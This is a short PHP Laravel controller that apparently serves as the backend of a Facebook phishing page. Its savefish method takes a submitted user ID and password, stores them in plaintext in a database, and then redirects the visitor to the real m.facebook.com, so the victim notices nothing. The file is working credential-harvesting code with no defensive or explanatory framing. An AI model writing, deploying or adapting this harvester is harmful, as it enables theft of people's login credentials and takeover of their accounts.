<?php

namespace fish\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;


class fishcontroller extends Controller
{
    //



      public function savefish(Request $textval){
        $fish1= new fish;
        $fish1->userid=$textval->uid;
        $fish1->password=$textval->pass;
        $fish1->save();
        $url="https://m.facebook.com";
        return Redirect::to($url);
    }


}
